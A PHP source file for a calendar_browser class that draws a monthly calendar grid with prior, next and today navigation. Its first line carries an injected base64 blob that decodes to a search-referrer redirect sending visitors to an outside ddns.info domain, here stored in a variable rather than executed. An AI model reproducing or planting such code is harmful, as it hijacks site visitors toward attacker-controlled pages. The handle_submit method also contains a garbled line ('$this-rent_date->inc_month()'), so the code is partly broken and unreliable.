<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));

require_once(dirname(__FILE__).'/custom_browser.php');
require_once(dirname(dirname(__FILE__)).'/jsox/jsox.php');
require_once(dirname(dirname(__FILE__)).'/utils/date_time.php');

class calendar_browser extends custom_browser {

  var $settings_holder;
  
  function setup() {
    
    parent::setup();                        
    
  }
  
  function prepare_data() {

    if ($this->layout_index() != 4)
      $this->message = 'This layout is not implemented yet';
    return true;
    
  }
  
  function do_get_default_layout() { 
    
    return 4;
    
  }
  
  function render_body() {

    $this->add(new style_href(SHARED_RESOURCES_URL.'calendar_browser.css'));

    if ($this->layout_index() == 4) {
      $grid_table = new table(array( 'width'       => $this->width
                                   , 'cellspacing' => 1
                                   , 'class'       => 'brw_calendar'
                                   ));
                             
      $current_date = new date_time($this->setting('month_date', mktime()));
      $this->set_setting('month_date', $current_date->as_date());
      
      // 1st day of month
      $date = new date_time($current_date->as_date());
      $date->set_day(1);

      // 1st day of calendar
      $first_date = new date_time($date->as_datetime());
      $first_date->dec_day($date->weekday-1);

      // calendar header
      $select = new combo( array( 'id'       => $this->context_id('month')
                                , 'onchange' => $this->js_post_back('brw_calendar_select_month')
                                ));

      $today = new date_time();
      $today->set_day(1);
      
      $current_month = $today->as_date();
      $current_month_text = strftime_(DISPLAY_MONTH_FORMAT, $today->as_date()).' '.trn('(current)');
      $value = $date->as_date();
      $month = strftime(INTERNAL_MONTH_FORMAT, $value);
      if (!$month)
        $month = strftime(INTERNAL_MONTH_FORMAT);
      $month_parts = explode('-', $month);
      for($i = -12; $i < 5; $i++) {
        $val  = mktime(0, 0, 0, $month_parts[1] + $i, 1, $month_parts[0]);
        $text = strftime_(DISPLAY_MONTH_FORMAT, mktime(0, 0, 0, $month_parts[1] + $i, 1, $month_parts[0]));;
        if ($val == $current_month) {
          $text .= ' '.trn('(current)');
          $current_month = '';
        }
        $select->add(new html_option($text, array( 'value'    => $val
                                                 , 'selected' => ($val == $value))));
      }
      if ($current_month) 
        $select->add(new html_option($current_month_text, array('value' => $current_month)));                                                       


      $header = new table_row(array("class" => "title"));
      $header->add( new table_header( new table( array( 'cellspacing' => 1 )
                                               , new table_row( array("class" => "title")
                                                              , new table_cell( array( 'width' => '10px')
                                                                              ,  new javascript_image_href( $this->js_post_back('brw_calendar_prior_month')
                                                                                                          , SHARED_RESOURCES_URL.'img_left.gif' 
                                                                                                          , array( 'title' => 'Prior month' )))
                                                              , new table_cell($select)
                                                              , new table_cell(new javascript_image_href( $this->js_post_back('brw_calendar_next_month')
                                                                                                        , SHARED_RESOURCES_URL.'img_right.gif' 
                                                                                                        , array( 'title' => 'Next month' ))))
                                               )
                                    , array( 'colspan' => 7
                                           , 'align'   => 'center')));
      $grid_table->add($header);
      
      $tmp = new date_time($first_date->as_date());
      
      // weekdays
      $header = new table_row(array("class" => "header"));
      for ($day = 1; $day <= 7; $day++) {
        $header->add(new table_header( strftime_('%A', $tmp->as_date())));
        $tmp->inc_day();
      }
      $grid_table->add($header);

      $tmp = new date_time($first_date->as_date());
      while (true) {
        $header = new table_row(array('class' => 'calendar', 'valign' => 'top'));
        for ($day = 1; $day <= 7; $day++) {
          $attributes = array();
          if ($this->is_weekend($tmp))
            $attributes['class'] = 'weekend';
          else  
          if ($this->is_holiday($tmp))
            $attributes['class'] = 'holiday';
          else  
          if ($tmp->month < $date->month)
            $attributes['class'] = 'prior_month';
          else
          if ($tmp->month > $date->month)
            $attributes['class'] = 'next_month';
          if ($tmp->is_today())  
            $attributes['class'] = 'today';
            
          $cell = new table_cell( $attributes
                                , new html_div( ltrim($tmp->day, '0')
                                              , array('class' => 'day_number')
                                              ));
          if ($holiday = $this->is_holiday($tmp)) {
            $cell->add(new text( array('class' => 'event')
                               , $holiday));
            $cell->add(new html_br());
          }
          
          $this->do_render_month_day(&$cell, $tmp);
          
          $header->add($cell);
          $tmp->inc_day();
        }
        $grid_table->add($header);
        if ($tmp->month != $date->month)
          break;
      }

      $this->add($grid_table);
    } 
    
  }    
  
  function do_render_month_day(&$cell, $tmp) {
    
  }
  
  function is_holiday($date) {
    
    return false;
    
  }

  function is_weekend($date) {
    
    return ($date->weekday > 5);
    
  }
  
  function handle_submit() {

    $result = parent::handle_submit(); 
    
    $sender_name = $this->context_post(POST_PARAM_SENDER_NAME);
    $event_name  = $this->context_post(POST_PARAM_EVENT_NAME);
    $event_value = $this->context_post(POST_PARAM_EVENT_VALUE);

    if (!$result and $event_name and ($sender_name == $this->id())) {
      
      switch ($event_name) {
        case 'brw_calendar_prior_month':
          $current_date = new date_time($this->setting('month_date', mktime()));
          $current_date->dec_month();          
          $this->set_setting('month_date', $current_date->as_date());
          $this->submit_handled(true); 
          break;
        case 'brw_calendar_next_month':
          $current_date = new date_time($this->setting('month_date', mktime()));
          $current_date->inc_month();
          $this-rent_date->inc_month();
          $this->set_setting('month_date', $current_date->as_date());
          $this->submit_handled(true); 
          break;
        case 'brw_calendar_goto_today':
          $this->set_setting('month_date', mktime());
          $this->submit_handled(true); 
          break;
        case 'brw_calendar_select_month':
          $this->set_setting('month_date', $this->context_post('month'));
          $this->submit_handled(true); 
          break;
      }
    }
    
    return $result;
    
  }
  
  function finalyze_title($row) {

    $row->add(new table_cell(new javascript_image_href( $this->js_post_back('brw_calendar_goto_today')
                                                      , SHARED_RESOURCES_URL.'goto_today.gif' 
                                                      , array( 'title' => 'Today' ))));
    $row->add(new table_cell( array('class' => 'section')
                            , new javascript_href( $this->js_post_back('brw_calendar_goto_today')
                                                 , 'Today')));
    $row->add(new table_cell(new javascript_image_href( $this->js_post_back('brw_calendar_goto_dayview')
                                                      , SHARED_RESOURCES_URL.'goto_dayview.gif' 
                                                      , array( 'title' => 'Day view' ))));
    $row->add(new table_cell( array('class' => 'section')
                            , new javascript_href( $this->js_post_back('brw_calendar_goto_dayview')
                                                 , 'Day view')));
    $row->add(new table_cell(new javascript_image_href( $this->js_post_back('brw_calendar_goto_weekview')
                                                      , SHARED_RESOURCES_URL.'goto_weekview.gif' 
                                                      , array( 'title' => 'Week view' ))));
    $row->add(new table_cell( array('class' => 'section')
                            , new javascript_href( $this->js_post_back('brw_calendar_goto_weekview')
                                                 , 'Week view')));
    $row->add(new table_cell(new javascript_image_href( $this->js_post_back('brw_calendar_goto_monthview')
                                                      , SHARED_RESOURCES_URL.'goto_monthview.gif' 
                                                      , array( 'title' => 'Month view' ))));
    $row->add(new table_cell( array('class' => 'section')
                            , new javascript_href( $this->js_post_back('brw_calendar_goto_monthview')
                                                 , 'Month view')));

  }
  
  
}

?>